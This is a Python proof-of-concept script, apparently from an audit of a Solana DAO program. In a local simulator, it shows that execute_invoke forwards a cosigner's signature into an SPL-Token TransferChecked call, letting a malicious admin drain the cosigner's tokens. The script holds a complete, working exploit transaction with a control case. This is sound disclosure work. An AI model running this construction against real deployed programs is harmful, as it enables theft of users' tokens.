"""TR-2 PoC: execute_invoke forwards the cosigner's outer signature into the CPI.

Runs against the ORIGINAL evidence/mainnet.so only.
A malicious DAO admin builds an execute_invoke whose inner CPI is an SPL-Token
TransferChecked that moves tokens OUT OF the cosigner's own token account, using
the cosigner as the transfer authority. Because handle_execute_invoke sets
    is_signer = (key == wallet) || account.is_signer
for every remaining account, and the cosigner signed the outer transaction, the
cosigner is presented to the Token program as a signer -> the transfer of the
cosigner's tokens succeeds. This is a confused-deputy: the cosigner intended only
to co-approve a treasury action, but its own authority was exercised.

This reproduces the signer-forwarding MECHANISM on the original binary. Real-world
impact additionally depends on (a) the off-chain cosigning service agreeing to
co-sign such a transaction and (b) the cosigner key actually holding assets or
authorities. Both are outside this binary.
"""
import sys, pathlib, json, base64, hashlib, struct
sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[2] / 'scripts'))
from differential import (ROOT, PROGRAM, Account, AccountMeta, Instruction, Keypair,
                          LiteSVM, Message, Pubkey, Transaction)
from differential_burn import TOKEN, ATA

ORIG = ROOT / 'evidence' / 'mainnet.so'

def run(binary, forward_victim=True):
    accounts = json.loads((ROOT/'evidence/full-account-samples.json').read_text())['accounts']
    accounts.update(json.loads((ROOT/'evidence/related-accounts.json').read_text()))
    k, a = next((k, a) for k, a in accounts.items() if a and a['space'] == 256)
    sd = bytearray(base64.b64decode(a['data'][0]))
    admin = Pubkey.from_bytes(bytes(sd[8:40])); mint = Pubkey.from_bytes(bytes(sd[40:72])); state = Pubkey.from_string(k)
    vm = LiteSVM().with_sigverify(False).with_transaction_history(0)
    vm.add_program(PROGRAM, binary.read_bytes())
    for kk, aa in accounts.items():
        if aa:
            vm.set_account(Pubkey.from_string(kk), Account(aa['lamports'], base64.b64decode(aa['data'][0]),
                Pubkey.from_string(aa['owner']), aa['executable'], aa['rentEpoch']))
    payer = Keypair.from_seed(bytes([42])*32); vm.airdrop(payer.pubkey(), 10**10)
    wallet, _ = Pubkey.find_program_address([b'wallet', bytes(mint)], PROGRAM)
    vm.set_account(wallet, Account(10**9, b'', Pubkey.default()))
    cosign = Pubkey.from_string(next(kk for kk, aa in accounts.items() if aa and aa['space'] == 41))
    cosigner = Pubkey.from_bytes(base64.b64decode(accounts[str(cosign)]['data'][0])[9:41])
    vm.set_account(cosigner, Account(10**8, b'', Pubkey.default()))
    # fund NOT closed so execute_invoke runs
    sd[112] = 0
    vm.set_account(state, Account(10**8, bytes(sd).ljust(256, b'\0'), PROGRAM))

    # Victim token world: a SPL-Token mint and the cosigner's own token account.
    victim_mint = Pubkey.from_bytes(bytes([70])*32)
    md = bytearray(82); md[36:44] = struct.pack('<Q', 10**9); md[44] = 6; md[45] = 1
    vm.set_account(victim_mint, Account(10**7, bytes(md), TOKEN))
    def ta(owner, amount):
        key, _ = Pubkey.find_program_address([bytes(owner), bytes(TOKEN), bytes(victim_mint)], ATA)
        d = bytearray(165); d[:32] = bytes(victim_mint); d[32:64] = bytes(owner)
        d[64:72] = struct.pack('<Q', amount); d[108] = 1
        vm.set_account(key, Account(10**7, bytes(d), TOKEN)); return key
    attacker_tokens = ta(admin, 0)              # admin-controlled destination

    # forward_victim=True : the authority is the COSIGNER, which is a required outer
    #   signer of execute_invoke (ExecuteInvoke.cosigner), hence a message-level signer,
    #   hence is_signer is forwarded into the CPI -> its own tokens can be moved.
    # forward_victim=False: CONTROL. The authority is a fresh key that signed NOTHING.
    #   Its is_signer is false, so the Token program must reject the transfer.
    if forward_victim:
        victim = cosigner
    else:
        victim = Keypair.from_seed(bytes([77])*32).pubkey()
        vm.set_account(victim, Account(10**8, b'', Pubkey.default()))
    victim_tokens = ta(victim, 1000)            # the victim's OWN tokens

    # Inner CPI = SPL-Token TransferChecked(amount=1000, decimals=6), authority = victim.
    inner = bytes([12]) + struct.pack('<Q', 1000) + bytes([6])
    # Outer execute_invoke accounts (same order as ExecuteInvoke struct), then remaining accounts.
    outer = [AccountMeta(admin, True, True), AccountMeta(mint, False, False), AccountMeta(state, False, True),
             AccountMeta(wallet, False, True), AccountMeta(TOKEN, False, False),
             AccountMeta(cosigner, True, False), AccountMeta(cosign, False, False)]
    # remaining accounts for the TransferChecked CPI. 'victim' is listed as the authority
    # and marked non-signer here; the program only forwards is_signer from the MESSAGE.
    remaining = [AccountMeta(victim_tokens, False, True), AccountMeta(victim_mint, False, False),
                 AccountMeta(attacker_tokens, False, True), AccountMeta(victim, False, False)]
    data = hashlib.sha256(b'global:execute_invoke').digest()[:8] + struct.pack('<I', len(inner)) + inner
    ix = Instruction(PROGRAM, data, outer + remaining)
    tx = Transaction.new_unsigned(Message.new_with_blockhash([ix], payer.pubkey(), vm.latest_blockhash()))
    r = json.loads(vm.send_transaction(tx).to_json())
    victim_bal = struct.unpack('<Q', bytes(vm.get_account(victim_tokens).data[64:72]))[0]
    atk_bal = struct.unpack('<Q', bytes(vm.get_account(attacker_tokens).data[64:72]))[0]
    return {'error': r.get('err'), 'victim_balance': victim_bal, 'attacker_balance': atk_bal,
            'logs': r.get('meta', r).get('logs')}

def main():
    print("=== TR-2 against ORIGINAL", ORIG, "===")
    attack = run(ORIG, forward_victim=True)
    print("attack  (authority = cosigner, a forced outer signer):", attack['error'],
          "victim_balance:", attack['victim_balance'], "attacker_balance:", attack['attacker_balance'])
    control = run(ORIG, forward_victim=False)
    print("control (authority = fresh key that signed nothing)  :", control['error'],
          "victim_balance:", control['victim_balance'])
    assert attack['error'] is None, "attack transfer should succeed via forwarded signer"
    assert attack['victim_balance'] == 0 and attack['attacker_balance'] == 1000, \
        "cosigner's tokens should have moved to the attacker"
    assert control['error'] is not None, "a non-signer authority must be rejected by the Token program"
    print("=> The cosigner's own tokens were moved by the admin, using the cosigner's")
    print("   forwarded outer signature as the Token transfer authority.")
    print("TR-2 mechanism CONFIRMED on original.")

if __name__ == '__main__':
    main()
